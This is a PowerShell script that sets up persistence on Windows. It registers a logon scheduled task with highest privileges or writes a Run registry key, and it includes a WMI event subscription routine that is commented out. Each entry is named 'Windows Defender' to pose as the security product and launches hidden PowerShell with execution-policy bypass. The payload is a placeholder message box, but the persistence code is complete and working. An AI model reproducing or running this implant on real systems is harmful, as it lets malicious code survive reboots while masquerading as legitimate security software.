$file = $PSCommandPath
$window_hidden = $true

if ($window_hidden) {
    $extra_code = "-WindowStyle Hidden"
} else {
    $extra_code = ""
}

$to_execute = "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Your message here $file')"
$command = "powershell $extra_code -exec bypass -C ""$to_execute"""

function IsAdmin {
    $wid = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $prp = New-Object System.Security.Principal.WindowsPrincipal($wid)
    $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
    return $prp.IsInRole($adm)
}

function PersistanceRegistry {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "Windows Defender"
    $regValue = "$command"
    if (!(Test-Path $regPath)) {
        New-Item -Path $regPath -Force
    }
    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
}

function PersistanceWMISubscriptions {
    # https://github.com/n0pe-sled/WMI-Persistence/blob/master/WMI-Persistence.ps1
    $EventFilterName = 'Cleanup'
    $EventConsumerName = 'DataCleanup'

    # Create event filter
    $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = $EventFilterName
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
        QueryLanguage = 'WQL'
    }

    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

    # Create CommandLineEventConsumer
    $CommandLineConsumerArgs = @{
        Name = $EventConsumerName
        CommandLineTemplate = $command
    }
    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

    # Create FilterToConsumerBinding
    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }
    Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs

    #Confirm the Event Filter was created
    $EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
    if ($null -ne $EventCheck) {
        Write-Host "Event Filter $EventFilterName successfully written to host"
    }

    #Confirm the Event Consumer was created
    $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
    if ($null -ne $ConsumerCheck) {
        Write-Host "Event Consumer $EventConsumerName successfully written to host"
    }

    #Confirm the FiltertoConsumer was created
    $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name='$EventFilterName'"""
    if ($null -ne $BindingCheck){
        Write-Host "Filter To Consumer Binding successfully written to host"
    }
}

function PersistanceTaskScheduler {
    $taskName = "Windows Defender"
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    $task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$extra_code -exec bypass -NoProfile -C ""$to_execute"""
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $taskName -Description "Windows Defender Startup" -RunLevel Highest -Force | Out-Null
}

function Main {
    if (IsAdmin) {
        #PersistanceWMISubscriptions
        PersistanceTaskScheduler
    } else {
        PersistanceRegistry
    }
}

Main